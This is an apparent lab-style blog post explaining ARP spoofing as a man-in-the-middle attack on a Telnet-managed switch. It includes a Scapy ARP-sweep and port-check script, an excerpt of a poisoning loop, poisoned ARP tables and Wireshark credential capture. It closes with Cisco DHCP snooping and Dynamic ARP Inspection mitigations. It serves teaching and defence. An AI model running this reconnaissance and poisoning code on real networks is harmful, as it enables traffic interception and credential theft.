---
title: Why you should not use telnet!
description: MITM attack (ARP Spoofing)
date: 2026-01-01 15:00:50 +0800
categories: [Security, L2 Attacks, ARP]
tags: [Security]
pin: false
math: false
mermaid: true

---

![Desktop View](/images/ARP/a.png){: width="972" height="589" }

# ARP Spoofing Attack Explained

## What is ARP Spoofing?

**ARP Spoofing** is a network attack technique where hackers send forged ARP (Address Resolution Protocol) messages to manipulate and intercept network traffic. This attack allows an attacker to:

- **Disrupt** normal network communication
- **Intercept** and monitor network traffic
- **Perform man-in-the-middle attacks**
- **Redirect traffic** through the attacker's device

### How It Works:
The attacker sends fake ARP responses that associate their MAC address with the IP address of another legitimate device on the network. This poisons the ARP caches of target devices, making them send traffic to the attacker instead of the intended destination.

---

## Network Topology

![ARP Spoofing - Network Topology](/images/ARP/ARP_1.drawio.png)
*Figure 1: ARP Spoofing Attack Network Topology*

---

## Attack Execution

### Objective:
Become a man-in-the-middle between the Admin device and SwitchB, enabling continuous traffic monitoring without detection.

### Phase 1: Reconnaissance
The attacker performs ARP sweep (sending ARP requests to all IP addresses in a subnet) to identify devices with an active IP stack.
Then for those addresses, the attacker checks for exposed not encrypted management services:
- Telnet (TCP/23)
- HTTP (TCP/80)



```python
from scapy.all import ARP, Ether, srp
import socket

NETWORK = "10.0.0.0/24"
TIMEOUT = 1

def arp_sweep(network):
    print("[*] Performing ARP sweep...")
    arp = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp

    result = srp(packet, timeout=2, verbose=False)[0]

    hosts = []
    for sent, received in result:
        hosts.append(received.psrc)

    return hosts


def check_port(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(TIMEOUT)
    try:
        s.connect((ip, port))
        s.close()
        return True
    except:
        return False


def service_scan(hosts):
    print("[*] Checking for Telnet (23) and HTTP (80)...")
    for ip in hosts:
        print(ip)
        telnet = check_port(ip, 23)
        http = check_port(ip, 80)

        if telnet or http:
            print(f"[+] {ip}")
            if telnet:
                print("    - Telnet (TCP/23) OPEN")
            if http:
                print("    - HTTP (TCP/80) OPEN")


if __name__ == "__main__":
    hosts = arp_sweep(NETWORK)
    service_scan(hosts)

```
Attacker finds out, that SwitchB is running telnet on IP 10.0.0.2.

```text
[*] Performing ARP sweep...
[*] Checking for Telnet (23) and HTTP (80)...
[+] 10.0.0.2
    - Telnet (TCP/23) OPEN
[+] 10.0.0.1
    - Telnet (TCP/23) OPEN
```

### Phase 2: ARP Cache Poisoning
The attacker sends forged ARP replies to both target devices [using this script](#automated-attack-script-scapy):

![Sending Forged ARP Message to SwitchB](/images/ARP/ARP2.drawio.png)
*Figure 2: Sending Forged ARP Message to SwitchB and Admin*

### Network Traffic Analysis:

![Wireshark - Attacker Executing the Attack](/images/ARP/wires.png)
*Figure 3: Wireshark Capture Showing Attack Sequence*

**Attack Sequence Visible in Wireshark:**
1. ARP requests to discover MAC addresses
2. Forged ARP replies to poison caches
3. Continuous spoofing to maintain the attack

---

## Attack Impact

### Poisoned ARP Tables:

```text
SwitchB#show arp
Protocol    Address    Age (min)   Hardware Addr    Type    Interface
Internet    10.0.0.10    0          00e0.9909.2fb3  ARPA    Vlan990
Internet    10.0.0.2    -           000e.3847.5600  ARPA    Vlan990
Internet    10.0.0.1    62          000d.edfd.15c0  ARPA    Vlan990
Internet    10.0.0.20   0           00e0.9909.2fb3  ARPA    Vlan990
```

```
C:\Users\Admin>arp -a

Interface: 10.0.0.20 --- 0x7
  Internet Address      Physical Address      Type
  10.0.0.1              00-0d-ed-fd-15-c0    dynamic
  10.0.0.2              00-e0-99-09-2f-b3    dynamic
  10.0.0.10             00-e0-99-09-2f-b3    dynamic
```

> As we see, both 10.0.0.2 and 10.0.0.20 are mapped to the same MAC -  `Attacker MAC`
{: .prompt-danger }

### Automated Attack Script (Scapy):
```python
try:
    admin_mac = get_mac(admin_ip)
    switch_mac = get_mac(switch_ip)
    if not admin_mac or not switch_mac:
        print("Failed to find MAC addresses.")
        exit()

    enable_ip_forwarding()
    while True:
        poison(admin_ip, admin_mac, switch_ip)
        poison(switch_ip, switch_mac, admin_ip)
        time.sleep(2)
```

### Network Traffic Flow after ARP poisoning:

![Infected Topology](/images/ARP/ARP3.drawio.png)
*Figure 4: Traffic Flow Through Attacker (Infected Topology)*

---

## Critical Security Breach

### Telnet Credential Theft:

Now that the attacker is in the middle of the traffic, he can run wireshark to capture packets sent between Admin and SwitchB.

![Wireshark - Intercepted Traffic](/images/ARP/ss.png)
*Figure 5: Wireshark Showing Intercepted Telnet Traffic*

Since Telnet transmits data in plaintext, the attacker can easily capture credentials to SwitchB console just by following TCP Stream.

![Wireshark - Captured Telnet Password](/images/ARP/ss1.png)
*Figure 6: Wireshark Showing Captured Telnet Password*


---

## Attack Mitigation

### Solution: Dynamic ARP Inspection (DAI)

To counter the attack, you can use the Dynamic ARP Inspection (DAI) mechanism, which is based on the DHCP binding table. When a client wants to obtain an IP address from a DHCP server, its MAC address and the obtained IP are recorded in the table. Now, when an ARP request reaches the switch, it will compare whether the addresses used in it match the DHCP binding table; if not, it will discard the frame.

#### Step 1: Enable DHCP Snooping


```bash
ip dhcp snooping
ip dhcp snooping vlan 990
```

#### Step 2: Enable Dynamic ARP Inspection


```bash
ip arp inspection vlan 990
```

#### Step 3: Trusted Bindings Database

![Adding Entry to Binding Table](/images/ARP/ARP5.drawio.png)
*Figure 7: DHCP Snooping Binding Database*

**How It Works:**
1. When a client obtains an IP via DHCP, the switch records the IP-MAC binding
2. This creates a trusted database of legitimate device mappings
3. ARP packets are validated against this database

#### Step 4: ARP Packet Validation

![DAI Process - ARP Frame Rejection](/images/ARP/ARP4.drawio.png)
*Figure 8: DAI Rejecting Invalid ARP Frame*

**Validation Process:**
1. Switch receives an ARP packet
2. Checks IP-MAC mapping against DHCP Snooping database
3. If mismatch is detected, packet is dropped
4. Logs security violation for monitoring

---
